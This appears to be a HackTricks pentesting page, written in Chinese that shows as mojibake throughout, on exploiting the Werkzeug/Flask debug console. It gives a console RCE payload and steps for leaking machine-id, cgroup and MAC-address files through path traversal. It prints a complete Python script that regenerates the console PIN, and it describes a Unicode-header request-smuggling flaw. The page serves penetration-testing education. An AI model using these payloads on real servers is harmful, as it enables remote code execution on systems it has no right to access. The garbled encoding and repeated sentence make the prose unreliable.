# Werkzeug / Flask Debug

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**å³æ—¶å¯ç”¨çš„æ¼æ´è¯„ä¼°ä¸æ¸—é€æµ‹è¯•è®¾ç½®**ã€‚ä»ä»»ä½•åœ°æ–¹è¿è¡Œå®Œæ•´çš„æ¸—é€æµ‹è¯•ï¼Œä½¿ç”¨ 20 å¤šç§å·¥å…·å’ŒåŠŸèƒ½ï¼Œä»ä¾¦å¯Ÿåˆ°æŠ¥å‘Šã€‚æˆ‘ä»¬ä¸æ›¿ä»£æ¸—é€æµ‹è¯•äººå‘˜ - æˆ‘ä»¬å¼€å‘è‡ªå®šä¹‰å·¥å…·ã€æ£€æµ‹å’Œåˆ©ç”¨æ¨¡å—ï¼Œä»¥ä¾¿è®©ä»–ä»¬æœ‰æ›´å¤šæ—¶é—´æ·±å…¥æŒ–æ˜ã€è·å– shell å¹¶äº«å—ä¹è¶£ã€‚

{% embed url="https://pentest-tools.com/" %}

## æ§åˆ¶å° RCE

å¦‚æœè°ƒè¯•å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œæ‚¨å¯ä»¥å°è¯•è®¿é—® `/console` å¹¶è·å¾— RCEã€‚
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

äº’è”ç½‘ä¸Šè¿˜æœ‰å‡ ä¸ªæ¼æ´ï¼Œæ¯”å¦‚[è¿™ä¸ª](https://github.com/its-arun/Werkzeug-Debug-RCE)æˆ–metasploitä¸­çš„ä¸€ä¸ªã€‚

## PINä¿æŠ¤ - è·¯å¾„éå†

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ**`/console`** ç«¯ç‚¹å°†å—åˆ°PINä¿æŠ¤ã€‚å¦‚æœæ‚¨æœ‰**æ–‡ä»¶éå†æ¼æ´**ï¼Œæ‚¨å¯ä»¥æ³„éœ²ç”Ÿæˆè¯¥PINæ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ã€‚

### Werkzeugæ§åˆ¶å°PINæ¼æ´

åœ¨åº”ç”¨ç¨‹åºä¸­å¼ºåˆ¶æ˜¾ç¤ºè°ƒè¯•é”™è¯¯é¡µé¢ä»¥æŸ¥çœ‹æ­¤å†…å®¹ï¼š
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
åœ¨å°è¯•è®¿é—® Werkzeug çš„è°ƒè¯•æ¥å£æ—¶ï¼Œä¼šé‡åˆ°å…³äºâ€œæ§åˆ¶å°é”å®šâ€çš„æ¶ˆæ¯ï¼ŒæŒ‡ç¤ºéœ€è¦ä¸€ä¸ª PIN æ¥è§£é”æ§åˆ¶å°ã€‚å»ºè®®é€šè¿‡åˆ†æ Werkzeug çš„è°ƒè¯•åˆå§‹åŒ–æ–‡ä»¶ (`__init__.py`) ä¸­çš„ PIN ç”Ÿæˆç®—æ³•æ¥åˆ©ç”¨æ§åˆ¶å° PINã€‚å¯ä»¥ä» [**Werkzeug æºä»£ç åº“**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) å­¦ä¹  PIN ç”Ÿæˆæœºåˆ¶ï¼Œä½†å»ºè®®é€šè¿‡æ–‡ä»¶éå†æ¼æ´è·å–å®é™…æœåŠ¡å™¨ä»£ç ï¼Œä»¥é¿å…æ½œåœ¨çš„ç‰ˆæœ¬å·®å¼‚ã€‚

è¦åˆ©ç”¨æ§åˆ¶å° PINï¼Œéœ€è¦ä¸¤ç»„å˜é‡ï¼Œ`probably_public_bits` å’Œ `private_bits`ï¼š

#### **`probably_public_bits`**

* **`username`**ï¼šæŒ‡å‘èµ· Flask ä¼šè¯çš„ç”¨æˆ·ã€‚
* **`modname`**ï¼šé€šå¸¸æŒ‡å®šä¸º `flask.app`ã€‚
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**ï¼šé€šå¸¸è§£æä¸º **Flask**ã€‚
* **`getattr(mod, '__file__', None)`**ï¼šè¡¨ç¤º Flask ç›®å½•ä¸­ `app.py` çš„å®Œæ•´è·¯å¾„ï¼ˆä¾‹å¦‚ï¼Œ`/usr/local/lib/python3.5/dist-packages/flask/app.py`ï¼‰ã€‚å¦‚æœ `app.py` ä¸é€‚ç”¨ï¼Œ**å°è¯• `app.pyc`**ã€‚

#### **`private_bits`**

* **`uuid.getnode()`**ï¼šè·å–å½“å‰æœºå™¨çš„ MAC åœ°å€ï¼Œ`str(uuid.getnode())` å°†å…¶è½¬æ¢ä¸ºåè¿›åˆ¶æ ¼å¼ã€‚
* è¦ **ç¡®å®šæœåŠ¡å™¨çš„ MAC åœ°å€**ï¼Œå¿…é¡»è¯†åˆ«åº”ç”¨ä½¿ç”¨çš„æ´»åŠ¨ç½‘ç»œæ¥å£ï¼ˆä¾‹å¦‚ï¼Œ`ens3`ï¼‰ã€‚å¦‚æœä¸ç¡®å®šï¼Œ**æ³„éœ² `/proc/net/arp`** ä»¥æ‰¾åˆ°è®¾å¤‡ IDï¼Œç„¶å **ä» `/sys/class/net/<device id>/address`** ä¸­æå– MAC åœ°å€ã€‚
*   å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼å°†åå…­è¿›åˆ¶ MAC åœ°å€è½¬æ¢ä¸ºåè¿›åˆ¶ï¼š

```python
# ç¤ºä¾‹ MAC åœ°å€: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**ï¼šå°† `/etc/machine-id` æˆ– `/proc/sys/kernel/random/boot_id` ä¸­çš„æ•°æ®ä¸ `/proc/self/cgroup` çš„ç¬¬ä¸€è¡Œåœ¨æœ€åä¸€ä¸ªæ–œæ ï¼ˆ`/`ï¼‰ä¹‹åçš„éƒ¨åˆ†è¿æ¥èµ·æ¥ã€‚

<details>

<summary>Code for `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

åœ¨æ”¶é›†æ‰€æœ‰å¿…è¦æ•°æ®åï¼Œå¯ä»¥æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬ä»¥ç”Ÿæˆ Werkzeug æ§åˆ¶å° PINï¼š

åœ¨æ”¶é›†æ‰€æœ‰å¿…è¦æ•°æ®åï¼Œå¯ä»¥æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬ä»¥ç”Ÿæˆ Werkzeug æ§åˆ¶å° PINã€‚è¯¥è„šæœ¬ä½¿ç”¨ç»„è£…çš„ `probably_public_bits` å’Œ `private_bits` åˆ›å»ºä¸€ä¸ªå“ˆå¸Œï¼Œç„¶åç»è¿‡è¿›ä¸€æ­¥å¤„ç†ä»¥ç”Ÿæˆæœ€ç»ˆçš„ PINã€‚ä»¥ä¸‹æ˜¯æ‰§è¡Œæ­¤è¿‡ç¨‹çš„ Python ä»£ç ï¼š
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
è¿™ä¸ªè„šæœ¬é€šè¿‡å¯¹è¿æ¥çš„ä½è¿›è¡Œå“ˆå¸Œï¼Œæ·»åŠ ç‰¹å®šçš„ç›ï¼ˆ`cookiesalt` å’Œ `pinsalt`ï¼‰ï¼Œå¹¶æ ¼å¼åŒ–è¾“å‡ºï¼Œç”Ÿæˆ PINã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ`probably_public_bits` å’Œ `private_bits` çš„å®é™…å€¼éœ€è¦ä»ç›®æ ‡ç³»ç»Ÿå‡†ç¡®è·å–ï¼Œä»¥ç¡®ä¿ç”Ÿæˆçš„ PIN ä¸ Werkzeug æ§åˆ¶å°é¢„æœŸçš„åŒ¹é…ã€‚

{% hint style="success" %}
å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯ **æ—§ç‰ˆæœ¬** çš„ Werkzeugï¼Œè¯·å°è¯•å°† **å“ˆå¸Œç®—æ³•æ›´æ”¹ä¸º md5** è€Œä¸æ˜¯ sha1ã€‚
{% endhint %}

## Werkzeug Unicode å­—ç¬¦

æ­£å¦‚åœ¨ [**è¿™ä¸ªé—®é¢˜**](https://github.com/pallets/werkzeug/issues/2833) ä¸­è§‚å¯Ÿåˆ°çš„ï¼ŒWerkzeug ä¸ä¼šå…³é—­å¸¦æœ‰ Unicode å­—ç¬¦çš„è¯·æ±‚å¤´ã€‚æ­£å¦‚åœ¨ [**è¿™ä¸ªå†™ä½œ**](https://mizu.re/post/twisty-python) ä¸­è§£é‡Šçš„ï¼Œè¿™å¯èƒ½å¯¼è‡´ CL.0 è¯·æ±‚èµ°ç§æ¼æ´ã€‚

è¿™æ˜¯å› ä¸ºï¼Œåœ¨ Werkzeug ä¸­å¯ä»¥å‘é€ä¸€äº› **Unicode** å­—ç¬¦ï¼Œè¿™ä¼šå¯¼è‡´æœåŠ¡å™¨ **å´©æºƒ**ã€‚ç„¶è€Œï¼Œå¦‚æœ HTTP è¿æ¥æ˜¯ä½¿ç”¨ **`Connection: keep-alive`** å¤´åˆ›å»ºçš„ï¼Œè¯·æ±‚çš„ä¸»ä½“å°†ä¸ä¼šè¢«è¯»å–ï¼Œè¿æ¥ä»å°†ä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œå› æ­¤è¯·æ±‚çš„ **ä¸»ä½“** å°†è¢«è§†ä¸º **ä¸‹ä¸€ä¸ª HTTP è¯·æ±‚**ã€‚

## è‡ªåŠ¨åŒ–åˆ©ç”¨

{% embed url="https://github.com/Ruulian/wconsole_extractor" %}

## å‚è€ƒæ–‡çŒ®

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**å³æ—¶å¯ç”¨çš„æ¼æ´è¯„ä¼°å’Œæ¸—é€æµ‹è¯•è®¾ç½®**ã€‚ä»ä»»ä½•åœ°æ–¹è¿è¡Œå®Œæ•´çš„æ¸—é€æµ‹è¯•ï¼Œä½¿ç”¨ 20 å¤šç§å·¥å…·å’ŒåŠŸèƒ½ï¼Œä»ä¾¦å¯Ÿåˆ°æŠ¥å‘Šã€‚æˆ‘ä»¬ä¸æ›¿ä»£æ¸—é€æµ‹è¯•äººå‘˜ - æˆ‘ä»¬å¼€å‘è‡ªå®šä¹‰å·¥å…·ã€æ£€æµ‹å’Œåˆ©ç”¨æ¨¡å—ï¼Œä»¥ä¾¿è®©ä»–ä»¬æœ‰æ›´å¤šæ—¶é—´æ·±å…¥æŒ–æ˜ã€è·å– shell å¹¶äº«å—ä¹è¶£ã€‚

{% embed url="https://pentest-tools.com/" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
